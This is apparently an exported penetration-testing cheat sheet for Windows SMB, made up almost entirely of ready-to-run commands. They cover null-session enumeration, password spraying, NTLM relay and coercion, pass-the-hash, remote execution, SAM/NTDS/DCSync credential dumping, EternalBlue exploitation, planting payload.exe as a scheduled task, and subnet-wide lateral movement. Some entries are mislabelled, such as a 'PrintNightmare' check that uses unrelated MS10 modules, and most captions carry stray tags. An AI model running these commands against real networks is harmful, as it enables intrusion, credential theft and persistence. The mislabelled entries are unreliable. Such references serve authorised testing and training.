---
id: "3bqrb1cdumpmzzai4"
title: "smb2"
description: ""
tags: []
order: 4
createdAt: "2026-05-26T18:57:37.516Z"
updatedAt: "2026-05-26T18:58:01.006Z"
---

## Recon & Enumeration
<!-- section: {"id":"uak8wwm5wmpmzzse0","order":0,"collapsed":false} -->

### 4m0hmq6cimpmzzsg4
```bash
nmap -sV -sC -p 139,445 $TARGET
nmap -sV -sC -p 139,445 $TARGET --script smb-os-discovery
rustscan -a $TARGET -p 139,445 -- -sV -sC
```

_Recon & Enumeration Initial SMB fingerprinting and version detection._

**Tags:** smb, recon, nmap, rustscan
<!-- cmd: {"id":"4m0hmq6cimpmzzsg4","language":"bash","sectionId":"uak8wwm5wmpmzzse0","tags":["smb","recon","nmap","rustscan"]} -->

### 3md3plts4mpmzzsg8
```bash
nmap -p 445 --script smb2-security-mode $TARGET
nmap -p 445 --script smb-security-mode $TARGET
netexec smb $TARGET
```

_Tags: #smb, #recon, #nmap, #rustscan SMB version and signing detection._

**Tags:** smb, signing, version, recon, netexec
<!-- cmd: {"id":"3md3plts4mpmzzsg8","language":"bash","sectionId":"uak8wwm5wmpmzzse0","tags":["smb","signing","version","recon","netexec"]} -->

### 527t0rqvympmzzsgb
```bash
enum4linux-ng -A $TARGET
enum4linux-ng -A $TARGET -u $USER -p $PASS
```

_Tags: #smb, #signing, #version, #recon, #netexec Full SMB enumeration via enum4linux-ng._

**Tags:** smb, enum4linux-ng, enum, unauthenticated, authenticated
<!-- cmd: {"id":"527t0rqvympmzzsgb","language":"bash","sectionId":"uak8wwm5wmpmzzse0","tags":["smb","enum4linux-ng","enum","unauthenticated","authenticated"]} -->

## Null Sessions
<!-- section: {"id":"48s5kyq8rmpmzzse8","order":1,"collapsed":false} -->

### tyh2q47w7mpmzzsgl
```bash
netexec smb $TARGET -u '' -p '' --shares
netexec smb $TARGET -u '' -p '' --users
netexec smb $TARGET -u '' -p '' --groups
netexec smb $TARGET -u '' -p '' --pass-pol
```

_Null Sessions Anonymous authentication checks._

**Tags:** smb, nullsession, anonymous, enum, netexec
<!-- cmd: {"id":"tyh2q47w7mpmzzsgl","language":"bash","sectionId":"48s5kyq8rmpmzzse8","tags":["smb","nullsession","anonymous","enum","netexec"]} -->

### juajg0tsumpmzzsgp
```bash
smbclient -L //$TARGET -N
smbclient //$TARGET/IPC$ -N
```

_Tags: #smb, #nullsession, #anonymous, #enum, #netexec Anonymous access via smbclient._

**Tags:** smb, nullsession, smbclient, anonymous
<!-- cmd: {"id":"juajg0tsumpmzzsgp","language":"bash","sectionId":"48s5kyq8rmpmzzse8","tags":["smb","nullsession","smbclient","anonymous"]} -->

### 439mukkr2mpmzzsgt
```bash
rpcclient -U "" -N $TARGET
rpcclient -U "" -N $TARGET -c "enumdomusers"
rpcclient -U "" -N $TARGET -c "enumdomgroups"
rpcclient -U "" -N $TARGET -c "querydominfo"
```

_Tags: #smb, #nullsession, #smbclient, #anonymous Anonymous RPC enumeration via rpcclient._

**Tags:** smb, rpcclient, nullsession, enum, users
<!-- cmd: {"id":"439mukkr2mpmzzsgt","language":"bash","sectionId":"48s5kyq8rmpmzzse8","tags":["smb","rpcclient","nullsession","enum","users"]} -->

## Guest Access
<!-- section: {"id":"88k0p3u0jmpmzzseb","order":2,"collapsed":false} -->

### uboeldrajmpmzzsh2
```bash
netexec smb $TARGET -u 'guest' -p '' --shares
netexec smb $TARGET -u 'guest' -p '' --users
smbclient -L //$TARGET -U guest%
smbmap -H $TARGET -u guest
```

_Guest Access Check guest account access to shares._

**Tags:** smb, guest, anonymous, shares, misconfiguration
<!-- cmd: {"id":"uboeldrajmpmzzsh2","language":"bash","sectionId":"88k0p3u0jmpmzzseb","tags":["smb","guest","anonymous","shares","misconfiguration"]} -->

## RID Bruteforce
<!-- section: {"id":"epjbulaacmpmzzsee","order":3,"collapsed":false} -->

### m4b02npqhmpmzzsha
```bash
netexec smb $TARGET -u '' -p '' --rid-brute
netexec smb $TARGET -u 'guest' -p '' --rid-brute
netexec smb $TARGET -u $USER -p $PASS --rid-brute
impacket-lookupsid $DOMAIN/$USER:$PASS@$TARGET
impacket-lookupsid anonymous@$TARGET
```

_RID Bruteforce Enumerate domain users via RID cycling._

**Tags:** smb, rid, bruteforce, users, enum, impacket
<!-- cmd: {"id":"m4b02npqhmpmzzsha","language":"bash","sectionId":"epjbulaacmpmzzsee","tags":["smb","rid","bruteforce","users","enum","impacket"]} -->

## Share Enumeration
<!-- section: {"id":"5iszpfgm9mpmzzsei","order":4,"collapsed":false} -->

### hs00v7ejympmzzshk
```bash
netexec smb $TARGET -u $USER -p $PASS --shares
smbmap -H $TARGET -u $USER -p $PASS
smbmap -H $TARGET -u $USER -p $PASS -R
smbclient -L //$TARGET -U $USER%$PASS
```

_Share Enumeration List and map all available shares._

**Tags:** smb, shares, enum, authenticated
<!-- cmd: {"id":"hs00v7ejympmzzshk","language":"bash","sectionId":"5iszpfgm9mpmzzsei","tags":["smb","shares","enum","authenticated"]} -->

### feqio5ez1mpmzzsho
```bash
nmap --script smb-enum-shares -p 445 $TARGET
nmap --script smb-enum-shares,smb-ls -p 445 $TARGET
nmap --script smb-enum-users -p 445 $TARGET
```

_Tags: #smb, #shares, #enum, #authenticated Enumerate shares with NSE scripts._

**Tags:** smb, nmap, nse, shares, enum
<!-- cmd: {"id":"feqio5ez1mpmzzsho","language":"bash","sectionId":"5iszpfgm9mpmzzsei","tags":["smb","nmap","nse","shares","enum"]} -->

## Share Access & Looting
<!-- section: {"id":"oeu37fasumpmzzsek","order":5,"collapsed":false} -->

### 85jn5xmuzmpmzzshw
```bash
smbclient //$TARGET/$SHARE -U $USER%$PASS
smbclient //$TARGET/$SHARE -U $USER%$PASS -c "ls"
smbclient //$TARGET/$SHARE -U $USER%$PASS -c "get filename.txt"
smbclient //$TARGET/$SHARE -U $USER%$PASS -c "recurse ON; ls"
```

_Share Access & Looting Connect and browse SMB shares._

**Tags:** smb, smbclient, shares, loot, authenticated
<!-- cmd: {"id":"85jn5xmuzmpmzzshw","language":"bash","sectionId":"oeu37fasumpmzzsek","tags":["smb","smbclient","shares","loot","authenticated"]} -->

### t60zt6vqkmpmzzsi0
```bash
smbmap -H $TARGET -u $USER -p $PASS -R $SHARE --depth 5
smbclient //$TARGET/$SHARE -U $USER%$PASS -c "recurse ON; prompt OFF; mget *"

# With impacket
impacket-smbclient $DOMAIN/$USER:$PASS@$TARGET
```

_Tags: #smb, #smbclient, #shares, #loot, #authenticated Recursive download of all files from share._

**Tags:** smb, loot, download, smbmap, smbclient
<!-- cmd: {"id":"t60zt6vqkmpmzzsi0","language":"bash","sectionId":"oeu37fasumpmzzsek","tags":["smb","loot","download","smbmap","smbclient"]} -->

### xf0sa3buwmpmzzsi3
```bash
netexec smb $TARGET -u $USER -p $PASS -M spider_plus
netexec smb $TARGET -u $USER -p $PASS -M spider_plus -o DOWNLOAD_FLAG=True
netexec smb $TARGET -u $USER -p $PASS -M spider_plus -o EXCLUDE_EXTENSIONS=exe,dll
```

_Tags: #smb, #loot, #download, #smbmap, #smbclient Spider shares and search for sensitive files._

**Tags:** smb, spider, loot, netexec, files
<!-- cmd: {"id":"xf0sa3buwmpmzzsi3","language":"bash","sectionId":"oeu37fasumpmzzsek","tags":["smb","spider","loot","netexec","files"]} -->

### c8vo6uw5dmpmzzsi7
```bash
# Linux
smbmap -H $TARGET -u $USER -p $PASS -R --pattern "password|secret|credential|config"

# Windows
findstr /S /I /M "password" \\$TARGET\$SHARE\*.txt \\$TARGET\$SHARE\*.xml \\$TARGET\$SHARE\*.ini \\$TARGET\$SHARE\*.config
```

_Tags: #smb, #spider, #loot, #netexec, #files Search for sensitive keywords in filenames._

**Tags:** smb, loot, passwords, sensitive-files, search
<!-- cmd: {"id":"c8vo6uw5dmpmzzsi7","language":"bash","sectionId":"oeu37fasumpmzzsek","tags":["smb","loot","passwords","sensitive-files","search"]} -->

## Authentication
<!-- section: {"id":"4f87wzyn9mpmzzseo","order":6,"collapsed":false} -->

### rkvotxriympmzzsii
```bash
netexec smb $TARGET -u $USER -p $PASS
netexec smb $TARGET -u $USER -H $HASH
netexec smb $TARGETS_FILE -u $USER -p $PASS --continue-on-success
```

_Authentication Test credentials against SMB._

**Tags:** smb, authentication, netexec, pass-the-hash
<!-- cmd: {"id":"rkvotxriympmzzsii","language":"bash","sectionId":"4f87wzyn9mpmzzseo","tags":["smb","authentication","netexec","pass-the-hash"]} -->

### p7ldyaiz0mpmzzsil
```bash
netexec smb $TARGET -u $USER -H $HASH
netexec smb $TARGET -u $USER -H $HASH --local-auth
impacket-smbclient $DOMAIN/$USER@$TARGET -hashes :$HASH
smbmap -H $TARGET -u $USER -p $HASH --no-pass
```

_Tags: #smb, #authentication, #netexec, #pass-the-hash Pass-the-Hash via SMB._

**Tags:** smb, pass-the-hash, authentication, lateral-movement, impacket
<!-- cmd: {"id":"p7ldyaiz0mpmzzsil","language":"bash","sectionId":"4f87wzyn9mpmzzseo","tags":["smb","pass-the-hash","authentication","lateral-movement","impacket"]} -->

## Password Spraying
<!-- section: {"id":"9qnmz19x9mpmzzser","order":7,"collapsed":false} -->

### fbj6ce35nmpmzzsit
```bash
netexec smb $TARGET -u users.txt -p $PASS --continue-on-success
netexec smb $TARGET -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
netexec smb $SUBNET/24 -u $USER -p $PASS --continue-on-success
kerbrute passwordspray --dc $DC -d $DOMAIN users.txt $PASS
```

_Password Spraying Spray credentials across SMB — mind lockout policy._

**Tags:** smb, password-spray, bruteforce, authentication, netexec, kerbrute
<!-- cmd: {"id":"fbj6ce35nmpmzzsit","language":"bash","sectionId":"9qnmz19x9mpmzzser","tags":["smb","password-spray","bruteforce","authentication","netexec","kerbrute"]} -->

## SMB Signing
<!-- section: {"id":"sfwfqwknhmpmzzset","order":8,"collapsed":false} -->

### 7pdjq2z1wmpmzzsiz
```bash
netexec smb $SUBNET/24 --gen-relay-list relay_targets.txt
nmap -p 445 --script smb2-security-mode $SUBNET/24
```

_SMB Signing Check SMB signing status across subnet (relay prereq)._

**Tags:** smb, signing, relay, misconfiguration, netexec, nmap
<!-- cmd: {"id":"7pdjq2z1wmpmzzsiz","language":"bash","sectionId":"sfwfqwknhmpmzzset","tags":["smb","signing","relay","misconfiguration","netexec","nmap"]} -->

## NTLM Relay Attacks
<!-- section: {"id":"k42bz1gtpmpmzzsex","order":9,"collapsed":false} -->

### jr8elsdzimpmzzsj5
```bash
# Terminal 1 — Disable SMB/HTTP on attacker and start relay
impacket-ntlmrelayx -tf relay_targets.txt -smb2support
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i  # interactive shell
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "whoami > C:\out.txt"
impacket-ntlmrelayx -tf relay_targets.txt -smb2support --no-http-server --no-wcf-server

# Terminal 2 — Capture with Responder (disable SMB/HTTP)
responder -I $INTERFACE -dPv
responder -I $INTERFACE -dPv --lm
```

_NTLM Relay Attacks Capture and relay NTLM hashes via SMB._

**Tags:** smb, ntlm-relay, responder, ntlmrelayx, lateral-movement
<!-- cmd: {"id":"jr8elsdzimpmzzsj5","language":"bash","sectionId":"k42bz1gtpmpmzzsex","tags":["smb","ntlm-relay","responder","ntlmrelayx","lateral-movement"]} -->

### yfpddw5m2mpmzzsj9
```bash
# PetitPotam
impacket-PetitPotam $LHOST $TARGET
impacket-PetitPotam -u $USER -p $PASS -d $DOMAIN $LHOST $TARGET

# Coercer
coercer coerce -u $USER -p $PASS -d $DOMAIN -l $LHOST -t $TARGET
coercer scan -u $USER -p $PASS -d $DOMAIN -t $TARGET

# PrinterBug / SpoolSample
impacket-dcomexec $DOMAIN/$USER:$PASS@$TARGET -object MMC20
```

_Tags: #smb, #ntlm-relay, #responder, #ntlmrelayx, #lateral-movement Coerce authentication for relay._

**Tags:** smb, coercion, petitpotam, coercer, printerbug, relay
<!-- cmd: {"id":"yfpddw5m2mpmzzsj9","language":"bash","sectionId":"k42bz1gtpmpmzzsex","tags":["smb","coercion","petitpotam","coercer","printerbug","relay"]} -->

### a8rw0yjk6mpmzzsjc
```bash
responder -I $INTERFACE -dwv
responder -I $INTERFACE -dwv --lm
# Crack captured hashes
hashcat -m 5600 hashes.txt rockyou.txt
hashcat -m 5600 hashes.txt rockyou.txt -r rules/best64.rule
john --format=netntlmv2 hashes.txt --wordlist=rockyou.txt
```

_Tags: #smb, #coercion, #petitpotam, #coercer, #printerbug, #relay NTLM capture only (no relay) with Responder._

**Tags:** smb, responder, ntlm, capture, hashcat, john
<!-- cmd: {"id":"a8rw0yjk6mpmzzsjc","language":"bash","sectionId":"k42bz1gtpmpmzzsex","tags":["smb","responder","ntlm","capture","hashcat","john"]} -->

## Remote Code Execution
<!-- section: {"id":"mgqr43mmvmpmzzsf0","order":10,"collapsed":false} -->

### xxg92kifwmpmzzsjo
```bash
impacket-psexec $DOMAIN/$USER:$PASS@$TARGET
impacket-psexec $DOMAIN/$USER@$TARGET -hashes :$HASH
impacket-psexec $DOMAIN/$USER:$PASS@$TARGET cmd.exe
```

_Remote Code Execution Execute commands via SMB — authenticated._

**Tags:** smb, psexec, rce, impacket, lateral-movement
<!-- cmd: {"id":"xxg92kifwmpmzzsjo","language":"bash","sectionId":"mgqr43mmvmpmzzsf0","tags":["smb","psexec","rce","impacket","lateral-movement"]} -->

### soy9f7mckmpmzzsjt
```bash
impacket-smbexec $DOMAIN/$USER:$PASS@$TARGET
impacket-smbexec $DOMAIN/$USER@$TARGET -hashes :$HASH
```

_Tags: #smb, #psexec, #rce, #impacket, #lateral-movement Execute commands via smbexec (no binary dropped on disk)._

**Tags:** smb, smbexec, rce, impacket, lateral-movement
<!-- cmd: {"id":"soy9f7mckmpmzzsjt","language":"bash","sectionId":"mgqr43mmvmpmzzsf0","tags":["smb","smbexec","rce","impacket","lateral-movement"]} -->

### zxnwf0klkmpmzzsjw
```bash
impacket-wmiexec $DOMAIN/$USER:$PASS@$TARGET
impacket-wmiexec $DOMAIN/$USER@$TARGET -hashes :$HASH
impacket-wmiexec $DOMAIN/$USER:$PASS@$TARGET -shell-type powershell
```

_Tags: #smb, #smbexec, #rce, #impacket, #lateral-movement Execute commands via WMI over SMB._

**Tags:** smb, wmiexec, rce, impacket, lateral-movement
<!-- cmd: {"id":"zxnwf0klkmpmzzsjw","language":"bash","sectionId":"mgqr43mmvmpmzzsf0","tags":["smb","wmiexec","rce","impacket","lateral-movement"]} -->

### iyed9bzwympmzzsjz
```bash
netexec smb $TARGET -u $USER -p $PASS -x "whoami /all"
netexec smb $TARGET -u $USER -p $PASS -X "Get-Process"
netexec smb $TARGET -u $USER -H $HASH -x "net user"
```

_Tags: #smb, #wmiexec, #rce, #impacket, #lateral-movement Execute commands via NetExec._

**Tags:** smb, rce, netexec, lateral-movement, command-execution
<!-- cmd: {"id":"iyed9bzwympmzzsjz","language":"bash","sectionId":"mgqr43mmvmpmzzsf0","tags":["smb","rce","netexec","lateral-movement","command-execution"]} -->

### g0ad30ny0mpmzzsk2
```bash
evil-winrm -i $TARGET -u $USER -p $PASS
evil-winrm -i $TARGET -u $USER -H $HASH
evil-winrm -i $TARGET -u $USER -p $PASS -s /path/to/ps1/scripts
```

_Tags: #smb, #rce, #netexec, #lateral-movement, #command-execution Shell access via WinRM._

**Tags:** smb, winrm, evil-winrm, shell, lateral-movement
<!-- cmd: {"id":"g0ad30ny0mpmzzsk2","language":"bash","sectionId":"mgqr43mmvmpmzzsf0","tags":["smb","winrm","evil-winrm","shell","lateral-movement"]} -->

## Credential Dumping
<!-- section: {"id":"e0k9kkrgsmpmzzsf3","order":11,"collapsed":false} -->

### s4zep0ej1mpmzzska
```bash
netexec smb $TARGET -u $USER -p $PASS --sam
netexec smb $TARGET -u $USER -p $PASS --lsa
netexec smb $TARGET -u $USER -p $PASS --ntds
netexec smb $TARGET -u $USER -H $HASH --sam
```

_Credential Dumping Dump SAM, LSA, NTDS via SMB._

**Tags:** smb, credential-dump, sam, lsa, ntds, netexec
<!-- cmd: {"id":"s4zep0ej1mpmzzska","language":"bash","sectionId":"e0k9kkrgsmpmzzsf3","tags":["smb","credential-dump","sam","lsa","ntds","netexec"]} -->

### 8fto0atj3mpmzzskd
```bash
impacket-secretsdump $DOMAIN/$USER:$PASS@$TARGET
impacket-secretsdump $DOMAIN/$USER@$TARGET -hashes :$HASH
impacket-secretsdump $DOMAIN/$USER:$PASS@$TARGET -just-dc-ntlm
impacket-secretsdump $DOMAIN/$USER:$PASS@$TARGET -just-dc-user krbtgt
```

_Tags: #smb, #credential-dump, #sam, #lsa, #ntds, #netexec Dump credentials via impacket-secretsdump._

**Tags:** smb, secretsdump, credential-dump, ntds, impacket, dcsync
<!-- cmd: {"id":"8fto0atj3mpmzzskd","language":"bash","sectionId":"e0k9kkrgsmpmzzsf3","tags":["smb","secretsdump","credential-dump","ntds","impacket","dcsync"]} -->

### iz656jvd1mpmzzskg
```bash
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc-ntlm
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc-ntlm -just-dc-user Administrator
netexec smb $DC -u $USER -p $PASS --ntds --users --enabled
```

_Tags: #smb, #secretsdump, #credential-dump, #ntds, #impacket, #dcsync DCSync attack via SMB._

**Tags:** smb, dcsync, ntds, credential-dump, impacket, netexec, ad-abuse
<!-- cmd: {"id":"iz656jvd1mpmzzskg","language":"bash","sectionId":"e0k9kkrgsmpmzzsf3","tags":["smb","dcsync","ntds","credential-dump","impacket","netexec","ad-abuse"]} -->

## Named Pipes & RPC Abuse
<!-- section: {"id":"in2ddi0wdmpmzzsf6","order":12,"collapsed":false} -->

### smpnjj567mpmzzskv
```bash
nmap -p 445 --script smb-enum-pipes $TARGET
impacket-rpcdump $DOMAIN/$USER:$PASS@$TARGET
rpcclient -U "$USER%$PASS" $TARGET -c "enumdomusers"
rpcclient -U "$USER%$PASS" $TARGET -c "enumprinters"
rpcclient -U "$USER%$PASS" $TARGET -c "enumprivs"
rpcclient -U "$USER%$PASS" $TARGET -c "lsaenumsid"
```

_Named Pipes & RPC Abuse Enumerate and abuse named pipes._

**Tags:** smb, rpc, named-pipes, enum, rpcclient, impacket
<!-- cmd: {"id":"smpnjj567mpmzzskv","language":"bash","sectionId":"in2ddi0wdmpmzzsf6","tags":["smb","rpc","named-pipes","enum","rpcclient","impacket"]} -->

### ci38j5kxkmpmzzskz
```bash
rpcclient -U "$USER%$PASS" $TARGET -c "createdomuser $NEW_USER"
rpcclient -U "$USER%$PASS" $TARGET -c "setuserinfo2 $NEW_USER 24 'NewPass123!'"
```

_Tags: #smb, #rpc, #named-pipes, #enum, #rpcclient, #impacket Create domain user via RPC (if write access)._

**Tags:** smb, rpc, rpcclient, user-creation, ad-abuse, privilege-escalation
<!-- cmd: {"id":"ci38j5kxkmpmzzskz","language":"bash","sectionId":"in2ddi0wdmpmzzsf6","tags":["smb","rpc","rpcclient","user-creation","ad-abuse","privilege-escalation"]} -->

## Vulnerability Checks
<!-- section: {"id":"y7ua81vxsmpmzzsfa","order":13,"collapsed":false} -->

### 5aa4hgsz3mpmzzsl7
```bash
nmap --script smb-vuln* -p 445 $TARGET
nmap --script smb-vuln-ms17-010 -p 445 $TARGET
nmap --script smb-vuln-cve2009-3103 -p 445 $TARGET
nmap --script smb-vuln-ms08-067 -p 445 $TARGET
```

_Vulnerability Checks Scan for common SMB vulnerabilities._

**Tags:** smb, vulns, nmap, nse, eternalblue, ms17-010
<!-- cmd: {"id":"5aa4hgsz3mpmzzsl7","language":"bash","sectionId":"y7ua81vxsmpmzzsfa","tags":["smb","vulns","nmap","nse","eternalblue","ms17-010"]} -->

### 6yfggjz23mpmzzslb
```bash
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARGET; set LHOST $LHOST; run"
msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS $TARGET; run"
```

_Tags: #smb, #vulns, #nmap, #nse, #eternalblue, #ms17-010 EternalBlue / MS17-010 exploitation._

**Tags:** smb, eternalblue, ms17-010, metasploit, rce, exploit
<!-- cmd: {"id":"6yfggjz23mpmzzslb","language":"bash","sectionId":"y7ua81vxsmpmzzsfa","tags":["smb","eternalblue","ms17-010","metasploit","rce","exploit"]} -->

### ruexsg4ehmpmzzsle
```bash
impacket-rpcdump $TARGET | grep -i "MS-RPRN\|MS-PAR"
nmap -p 445 --script smb-vuln-ms10-054 $TARGET

# Exploit
msfconsole -q -x "use exploit/windows/smb/ms10_046_load_library; set RHOSTS $TARGET; run"
```

_Tags: #smb, #eternalblue, #ms17-010, #metasploit, #rce, #exploit PrintNightmare check and exploit._

**Tags:** smb, printnightmare, ms-rprn, rce, exploit, impacket
<!-- cmd: {"id":"ruexsg4ehmpmzzsle","language":"bash","sectionId":"y7ua81vxsmpmzzsfa","tags":["smb","printnightmare","ms-rprn","rce","exploit","impacket"]} -->

### kxcec2r68mpmzzslh
```bash
netexec smb $DC -u '' -p '' -M zerologon
```

_Tags: #smb, #printnightmare, #ms-rprn, #rce, #exploit, #impacket ZeroLogon check._

**Tags:** smb, zerologon, netexec, vuln-check, cve-2020-1472
<!-- cmd: {"id":"kxcec2r68mpmzzslh","language":"bash","sectionId":"y7ua81vxsmpmzzsfa","tags":["smb","zerologon","netexec","vuln-check","cve-2020-1472"]} -->

### 7e5dxfy7smpmzzslk
```bash
nmap -p 445 --script smb-vuln-covid $TARGET
nmap -p 445 --script smb-vuln-cve-2020-0796 $TARGET
```

_Tags: #smb, #zerologon, #netexec, #vuln-check, #cve-2020-1472 SMB Ghost / CVE-2020-0796 check._

**Tags:** smb, smbghost, cve-2020-0796, nmap, vuln-check
<!-- cmd: {"id":"7e5dxfy7smpmzzslk","language":"bash","sectionId":"y7ua81vxsmpmzzsfa","tags":["smb","smbghost","cve-2020-0796","nmap","vuln-check"]} -->

## Persistence via SMB
<!-- section: {"id":"arxz09gd5mpmzzsfc","order":14,"collapsed":false} -->

### v9flwztubmpmzzsls
```bash
# Upload file to share
smbclient //$TARGET/$SHARE -U $USER%$PASS -c "put payload.exe payload.exe"
impacket-smbclient $DOMAIN/$USER:$PASS@$TARGET -c "use $SHARE; put payload.exe"

# Create scheduled task via RPC
impacket-atexec $DOMAIN/$USER:$PASS@$TARGET "cmd.exe /c payload.exe"
netexec smb $TARGET -u $USER -p $PASS -M schtask -o NAME=Update CMD="payload.exe" TIME="09:00"
```

_Persistence via SMB Deploy payload via SMB share._

**Tags:** smb, persistence, payload, schtask, lateral-movement
<!-- cmd: {"id":"v9flwztubmpmzzsls","language":"bash","sectionId":"arxz09gd5mpmzzsfc","tags":["smb","persistence","payload","schtask","lateral-movement"]} -->

## Common Misconfigurations Checklist
<!-- section: {"id":"937jo74h1mpmzzsfg","order":15,"collapsed":false} -->

### 8i6ddd4i9mpmzzsm5
```bash
# 1. SMB signing disabled
netexec smb $SUBNET/24 --gen-relay-list relay_targets.txt

# 2. Null session
netexec smb $TARGET -u '' -p '' --shares

# 3. Guest access
netexec smb $TARGET -u 'guest' -p '' --shares

# 4. SMBv1 enabled
nmap -p 445 --script smb-protocols $TARGET

# 5. Default credentials
netexec smb $TARGET -u 'Administrator' -p 'Password123'
netexec smb $TARGET -u 'Administrator' -p ''
netexec smb $TARGET -u 'admin' -p 'admin'

# 6. MS17-010
nmap --script smb-vuln-ms17-010 -p 445 $TARGET

# 7. Writeable shares
smbmap -H $TARGET -u $USER -p $PASS -R --depth 3

# 8. SYSVOL / NETLOGON readable (GPP passwords)
netexec smb $TARGET -u $USER -p $PASS -M gpp_password
netexec smb $TARGET -u $USER -p $PASS -M gpp_autologin
```

_Common Misconfigurations Checklist Quick sweep for SMB misconfigurations across subnet._

**Tags:** smb, misconfiguration, checklist, signing, nullsession, smbv1, gpp
<!-- cmd: {"id":"8i6ddd4i9mpmzzsm5","language":"bash","sectionId":"937jo74h1mpmzzsfg","tags":["smb","misconfiguration","checklist","signing","nullsession","smbv1","gpp"]} -->

## GPP / cPassword Attack (SYSVOL)
<!-- section: {"id":"qyj3epdz6mpmzzsfi","order":16,"collapsed":false} -->

### o2v4fajrcmpmzzsmc
```bash
netexec smb $DC -u $USER -p $PASS -M gpp_password
netexec smb $DC -u $USER -p $PASS -M gpp_autologin
impacket-Get-GPPPassword $DOMAIN/$USER:$PASS@$DC
# Manual
smbclient //$DC/SYSVOL -U $USER%$PASS -c "recurse ON; prompt OFF; mget *"
grep -ri "cpassword" ./SYSVOL/
gpp-decrypt <cpassword_hash>
```

_GPP / cPassword Attack (SYSVOL) Extract GPP passwords from SYSVOL share._

**Tags:** smb, gpp, cpassword, sysvol, credential-access, misconfiguration
<!-- cmd: {"id":"o2v4fajrcmpmzzsmc","language":"bash","sectionId":"qyj3epdz6mpmzzsfi","tags":["smb","gpp","cpassword","sysvol","credential-access","misconfiguration"]} -->

## Post-Exploitation
<!-- section: {"id":"l3j1k8wcsmpmzzsfm","order":17,"collapsed":false} -->

### ka4glum5mmpmzzsmj
```bash
# SAM dump
netexec smb $TARGET -u $USER -p $PASS --sam
impacket-secretsdump $DOMAIN/$USER:$PASS@$TARGET -sam

# LSA secrets
netexec smb $TARGET -u $USER -p $PASS --lsa
impacket-secretsdump $DOMAIN/$USER:$PASS@$TARGET -lsa

# DPAPI secrets
netexec smb $TARGET -u $USER -p $PASS -M dpapi

# Logged on users
netexec smb $TARGET -u $USER -p $PASS --loggedon-users

# Sessions
netexec smb $TARGET -u $USER -p $PASS --sessions

# Disks
netexec smb $TARGET -u $USER -p $PASS --disks

# Installed software
netexec smb $TARGET -u $USER -p $PASS -M enum_av
netexec smb $TARGET -u $USER -p $PASS -x "wmic product get name,version"
```

_Post-Exploitation Dump credentials and pivot after SMB access._

**Tags:** smb, post-exploitation, credential-dump, dpapi, enum, netexec
<!-- cmd: {"id":"ka4glum5mmpmzzsmj","language":"bash","sectionId":"l3j1k8wcsmpmzzsfm","tags":["smb","post-exploitation","credential-dump","dpapi","enum","netexec"]} -->

### df5260016mpmzzsmm
```bash
# Spray hash across subnet
netexec smb $SUBNET/24 -u $USER -H $HASH --continue-on-success

# Find local admin access
netexec smb $SUBNET/24 -u $USER -H $HASH --local-auth

# Execute on all accessible hosts
netexec smb $SUBNET/24 -u $USER -H $HASH -x "whoami"
```

_Tags: #smb, #post-exploitation, #credential-dump, #dpapi, #enum, #netexec Lateral movement with obtained hashes._

**Tags:** smb, lateral-movement, pass-the-hash, netexec, post-exploitation
<!-- cmd: {"id":"df5260016mpmzzsmm","language":"bash","sectionId":"l3j1k8wcsmpmzzsfm","tags":["smb","lateral-movement","pass-the-hash","netexec","post-exploitation"]} -->
